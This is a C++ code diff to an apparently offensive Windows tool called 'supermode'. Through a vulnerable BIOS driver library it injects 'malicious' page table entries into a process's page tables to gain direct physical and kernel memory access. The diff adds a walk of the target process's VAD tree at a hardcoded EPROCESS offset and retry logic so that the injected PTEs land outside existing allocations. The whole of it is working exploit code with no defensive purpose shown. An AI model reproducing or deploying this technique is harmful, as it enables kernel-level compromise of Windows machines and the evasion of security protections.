@@ -112,15 +112,27 @@ namespace supermode
 		PT
 	};
 
+	struct FORBIDDEN_ZONE
+	{
+		uintptr_t begin;
+		uintptr_t end;
+	};
+
 	wnbios_lib wnbios;
 
 	uint64_t mal_pointer_pte_ind[4];
 	uint64_t mal_pte_ind[4];
 	uint64_t mal_pml4_pte_ind[4];
 
-	uint64_t mal_pointer_pte_struct[3];
-	uint64_t mal_pte_struct[3];
-	uint64_t mal_pml4_pte_struct[3];
+	uint64_t mal_pointer_pte_struct[4];
+	uint64_t mal_pte_struct[4];
+	uint64_t mal_pml4_pte_struct[4];
+
+	std::vector<FORBIDDEN_ZONE> forbidden_zones;
+	std::vector<int> banned_pml4_indices;
+	std::vector<int> banned_pdpt_indices;
+	std::vector<int> banned_pd_indices;
+	std::vector<int> banned_pt_indices;
 
 	struct PTE_PFN
 	{
@@ -128,6 +140,80 @@ namespace supermode
 		uint64_t offset;
 	};
 	PTE_PFN mal_pte_pfn;
+
+	typedef struct VAD_NODE {
+		VAD_NODE* Left;
+		VAD_NODE* Right;
+		VAD_NODE* Parent;
+		ULONG StartingVpn;
+		ULONG EndingVpn;
+		ULONG ulVpnInfo;
+		ULONG ReferenceCount;
+		PVOID PushLock;
+		ULONG u;
+		ULONG u1;
+		PVOID u5;
+		PVOID u2;
+		void* Subsection; // 0x48 - 0x50
+		PVOID FirstProtoPte; // 0x50 - 0x58
+		PVOID LastPte; // 0x58 - 0x60
+		_LIST_ENTRY ViewLinks;
+		void* VadsProcess; // 0x60 - 0x68
+		PVOID u4;
+		PVOID FileObject;
+	}VAD_NODE, * PVAD_NODE;
+
+	uintptr_t get_adjusted_va(BOOLEAN start, VAD_NODE vad)
+	{
+		UCHAR byte_offset = (start ? ((UCHAR*)&vad.ulVpnInfo)[0] : ((UCHAR*)&vad.ulVpnInfo)[1]);
+		DWORD64 hi_va_start = 0x100000000 * byte_offset;
+		hi_va_start += start ? vad.StartingVpn : vad.EndingVpn;
+
+		return (uintptr_t)hi_va_start;
+	}
+
+	void avl_iterate_over(VAD_NODE* node, uintptr_t dtb)
+	{
+		if (node == nullptr) {
+			return;
+		}
+
+		std::cout << "checking vad entry at: 0x" << std::hex << node << std::endl;
+
+		DWORD64 start_va_adjusted = get_adjusted_va(TRUE, *node);
+		DWORD64 end_va_adjusted = get_adjusted_va(FALSE, *node);
+
+		std::cout << std::hex << " start: " << std::hex << start_va_adjusted << " end : " << end_va_adjusted << std::endl;
+		forbidden_zones.push_back({ start_va_adjusted, end_va_adjusted });
+
+		if (node->Left != nullptr) {
+			VAD_NODE leftNode;
+			if (wnbios.read_virtual_memory((uintptr_t)node->Left, (uint64_t*)&leftNode, sizeof(VAD_NODE), dtb)) {
+				avl_iterate_over(&leftNode, dtb);
+			}
+		}
+
+		if (node->Right != nullptr) {
+			VAD_NODE rightNode;
+			if (wnbios.read_virtual_memory((uintptr_t)node->Right, (uint64_t*)&rightNode, sizeof(VAD_NODE), dtb)) {
+				avl_iterate_over(&rightNode, dtb);
+			}
+		}
+	}
+
+	void fill_forbidden_zones(uintptr_t dtb, uintptr_t eproc)
+	{
+		PVAD_NODE lpVadRoot;
+		uintptr_t system_cr3 = wnbios.get_system_dirbase();
+		if (!wnbios.read_virtual_memory((eproc + 0x7d8), (uint64_t*)&lpVadRoot, sizeof(PVAD_NODE), system_cr3))
+			return;
+
+		VAD_NODE vad;
+		if (!wnbios.read_virtual_memory((uintptr_t)lpVadRoot, (uint64_t*)&vad, sizeof(VAD_NODE), dtb))
+			return;
+
+		avl_iterate_over(&vad, dtb);
+	}
 
 	void valid_pml4e(uint64_t* pml4ind, uint64_t* pdptstruct)
 	{
@@ -150,10 +236,20 @@ namespace supermode
 			// page backs physical memory
 			if (pml4e.Present && pml4e.UserSupervisor)
 			{
-				std::cout << "Valid pml4 found at index " << i << std::endl;
-				*pml4ind = i;
-				*pdptstruct = pml4e.PageFrameNumber * 0x1000;
-				return;
+				bool banned = false;
+				for (auto& banned_ind : banned_pml4_indices)
+				{
+					if (banned_ind == i)
+						banned = true;
+				}
+
+				if (!banned)
+				{
+					std::cout << "Valid pml4 found at index " << i << std::endl;
+					*pml4ind = i;
+					*pdptstruct = pml4e.PageFrameNumber * 0x1000;
+					return;
+				}
 			}
 		}
 	}
@@ -179,10 +275,20 @@ namespace supermode
 			// page backs physical memory
 			if (pdpte.Present && pdpte.UserSupervisor)
 			{
-				std::cout << "Valid pdpte found at index " << i << std::endl;
-				*pdpteind = i;
-				*pdstruct = pdpte.PageFrameNumber * 0x1000;
-				return;
+				bool banned = false;
+				for (auto& banned_ind : banned_pdpt_indices)
+				{
+					if (banned_ind == i)
+						banned = true;
+				}
+
+				if (!banned)
+				{
+					std::cout << "Valid pdpte found at index " << i << std::endl;
+					*pdpteind = i;
+					*pdstruct = pdpte.PageFrameNumber * 0x1000;
+					return;
+				}
 			}
 		}
 	}
@@ -208,10 +314,21 @@ namespace supermode
 			// page backs physical memory
 			if (pde.Present && pde.UserSupervisor)
 			{
-				std::cout << "Valid pde found at index " << i << std::endl;
-				*pdind = i;
-				*ptstruct = pde.PageFrameNumber * 0x1000;
-				return;
+				bool banned = false;
+				for (auto& banned_ind : banned_pd_indices)
+				{
+					if (banned_ind == i)
+						banned = true;
+				}
+
+				if (!banned)
+				{
+
+					std::cout << "Valid pde found at index " << i << std::endl;
+					*pdind = i;
+					*ptstruct = pde.PageFrameNumber * 0x1000;
+					return;
+				}
 			}
 		}
 	}
@@ -236,9 +353,19 @@ namespace supermode
 
 			if (!pte.Present)
 			{
-				std::cout << "Free pte found at index " << i << std::endl;
-				*ptind = i;
-				return;
+				bool banned = false;
+				for (auto& banned_ind : banned_pt_indices)
+				{
+					if (banned_ind == i)
+						banned = true;
+				}
+
+				if (!banned)
+				{
+					std::cout << "Free pte found at index " << i << std::endl;
+					*ptind = i;
+					return;
+				}
 			}
 		}
 	}
@@ -297,11 +424,27 @@ namespace supermode
 	// this pte will point to physical mem
 	void insert_first_malicious_pte()
 	{
+		find_indices:
 		// find a free pte and populate other indices while at it
 		valid_pml4e(&mal_pte_ind[PML4], &mal_pte_struct[PDPT]);
 		valid_pdpte(mal_pte_struct[PDPT], &mal_pte_ind[PDPT], &mal_pte_struct[PD]);
 		valid_pde(mal_pte_struct[PD], &mal_pte_ind[PD], &mal_pte_struct[PT]);
 		free_pte(mal_pte_struct[PT], &mal_pte_ind[PT]);
+
+		uintptr_t va = generate_virtual_address(mal_pte_ind[PML4], mal_pte_ind[PDPT], mal_pte_ind[PD], mal_pte_ind[PT], 0);
+		uintptr_t vad_vpn = (va & 0xFFFFFFFFFFFFF000) / 0x1000;
+		for (auto& zone : forbidden_zones)
+		{
+			if (zone.begin <= vad_vpn && vad_vpn <= zone.end)
+			{
+				banned_pml4_indices.push_back(mal_pte_ind[PML4]);
+				banned_pdpt_indices.push_back(mal_pte_ind[PDPT]);
+				banned_pd_indices.push_back(mal_pte_ind[PD]);
+				banned_pt_indices.push_back(mal_pte_ind[PT]);
+
+				goto find_indices;
+			}
+		}
 
 		std::cout << "PML4: " << mal_pte_ind[PML4] << std::endl
 			<< "PDPT: " << mal_pte_ind[PDPT] << std::endl
@@ -328,10 +471,26 @@ namespace supermode
 	void insert_second_malicious_pte()
 	{
 		// find a free pte and populate other indices while at it
+		find_indices:
 		valid_pml4e(&mal_pointer_pte_ind[PML4], &mal_pointer_pte_struct[PDPT]);
 		valid_pdpte(mal_pointer_pte_struct[PDPT], &mal_pointer_pte_ind[PDPT], &mal_pointer_pte_struct[PD]);
 		valid_pde(mal_pointer_pte_struct[PD], &mal_pointer_pte_ind[PD], &mal_pointer_pte_struct[PT]);
 		free_pte(mal_pointer_pte_struct[PT], &mal_pointer_pte_ind[PT]);
+
+		uintptr_t va = generate_virtual_address(mal_pointer_pte_ind[PML4], mal_pointer_pte_ind[PDPT], mal_pointer_pte_ind[PD], mal_pointer_pte_ind[PT], 0);
+		uintptr_t vad_vpn = (va & 0xFFFFFFFFFFFFF000) / 0x1000;
+		for (auto& zone : forbidden_zones)
+		{
+			if (zone.begin <= vad_vpn && vad_vpn <= zone.end)
+			{
+				banned_pml4_indices.push_back(mal_pointer_pte_ind[PML4]);
+				banned_pdpt_indices.push_back(mal_pointer_pte_ind[PDPT]);
+				banned_pd_indices.push_back(mal_pointer_pte_ind[PD]);
+				banned_pt_indices.push_back(mal_pointer_pte_ind[PT]);
+
+				goto find_indices;
+			}
+		}
 
 		std::cout << "PML4: " << mal_pointer_pte_ind[PML4] << std::endl
 			<< "PDPT: " << mal_pointer_pte_ind[PDPT] << std::endl
@@ -358,10 +517,26 @@ namespace supermode
 		std::cout << "inserting third pte for dbt: " << std::hex << target_pml4 << std::dec << std::endl;
 
 		// find a free pte and populate other indices while at it
+		find_indices:
 		valid_pml4e(&mal_pml4_pte_ind[PML4], &mal_pml4_pte_struct[PDPT]);
 		valid_pdpte(mal_pml4_pte_struct[PDPT], &mal_pml4_pte_ind[PDPT], &mal_pml4_pte_struct[PD]);
 		valid_pde(mal_pml4_pte_struct[PD], &mal_pml4_pte_ind[PD], &mal_pml4_pte_struct[PT]);
 		free_pte(mal_pml4_pte_struct[PT], &mal_pml4_pte_ind[PT]);
+
+		uintptr_t va = generate_virtual_address(mal_pml4_pte_ind[PML4], mal_pml4_pte_ind[PDPT], mal_pml4_pte_ind[PD], mal_pml4_pte_ind[PT], 0);
+		uintptr_t vad_vpn = (va & 0xFFFFFFFFFFFFF000) / 0x1000;
+		for (auto& zone : forbidden_zones)
+		{
+			if (zone.begin <= vad_vpn && vad_vpn <= zone.end)
+			{
+				banned_pml4_indices.push_back(mal_pml4_pte_ind[PML4]);
+				banned_pdpt_indices.push_back(mal_pml4_pte_ind[PDPT]);
+				banned_pd_indices.push_back(mal_pml4_pte_ind[PD]);
+				banned_pt_indices.push_back(mal_pml4_pte_ind[PT]);
+
+				goto find_indices;
+			}
+		}
 
 		std::cout << "PML4: " << mal_pml4_pte_ind[PML4] << std::endl
 			<< "PDPT: " << mal_pml4_pte_ind[PDPT] << std::endl
